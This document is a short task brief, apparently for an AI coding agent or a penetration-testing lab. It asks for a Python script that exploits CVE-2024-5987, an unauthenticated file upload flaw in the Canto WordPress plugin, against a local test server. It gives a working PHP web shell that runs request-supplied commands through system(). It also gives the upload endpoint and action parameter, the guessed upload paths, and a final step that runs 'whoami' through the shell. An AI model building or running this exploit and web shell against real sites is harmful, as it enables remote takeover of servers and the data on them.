# Objective and context
Create a Python script to test the CVE-2024-5987 file upload vulnerability in Canto WordPress plugin. The script should:
1. Send a POST request to http://127.0.0.1:32816/wp-admin/admin-ajax.php
2. Include the action parameter as form data: action=canto_upload
3. Upload a PHP file (shell.php) with content: '<?php if(isset($_REQUEST["cmd"])){echo "<pre>";system($_REQUEST["cmd"]);echo "</pre>";die;}?>'
4. Include additional form fields: type=media, and other plugin-required fields
5. Use proper multipart/form-data encoding
6. Check the response for successful upload indicators
7. Try to access the uploaded file at common locations: /wp-content/uploads/2024/06/shell.php, /wp-content/uploads/shell.php, /wp-content/uploads/2024/shell.php
8. If successful, execute whoami command via the webshell

This is testing for unauthenticated arbitrary file upload vulnerability (CVE-2024-5987).

